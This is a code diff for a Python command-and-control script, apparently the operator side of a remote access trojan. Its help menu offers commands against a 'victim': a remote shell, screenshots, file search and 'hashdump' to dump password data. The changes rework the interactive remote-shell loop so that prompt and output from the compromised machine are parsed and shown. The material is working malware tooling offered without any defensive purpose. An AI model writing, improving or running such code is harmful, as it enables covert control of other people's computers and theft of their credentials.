@@ -1,7 +1,6 @@
 #!/usr/bin/python3
 from secure_socket import Server
 from sys import argv
-from time import sleep
 
 def help():
   print("""
@@ -13,7 +12,7 @@ COMMANDS :
   shell                  Start a shell on the victim.
   ipconfig               Display the victim's IP configuration.
   screenshot             Take a screenshot from the victim's screen.
-  search   file [path]   Find the location of a file in a directory, defaults to root directory.
+  search   [path] file   Find the location of a file in a directory, defaults to root directory.
   hashdump               Dump the sensitive data about users and passwords.
   exit                   Let the victim go.
 """)
@@ -37,10 +36,15 @@ def shell(victim):
   cmd=input(ps1)
   while cmd!='exit':
     victim.send(cmd)
-    print(victim.receive())
-    sleep(0.2)
-    ps1=victim.receive()
-    cmd=input(ps1)
+    prompt_out=victim.receive()
+    out="*".join(prompt_out.split('*')[1:])
+    prompt=prompt_out.split('*')[0]
+    if out!='':
+      if out[-1]=="\n":
+        print(out[:-1])
+      else:
+        print(out)
+    cmd=input(prompt)
   victim.send('exit')
 
 def run_command(server, cmd):
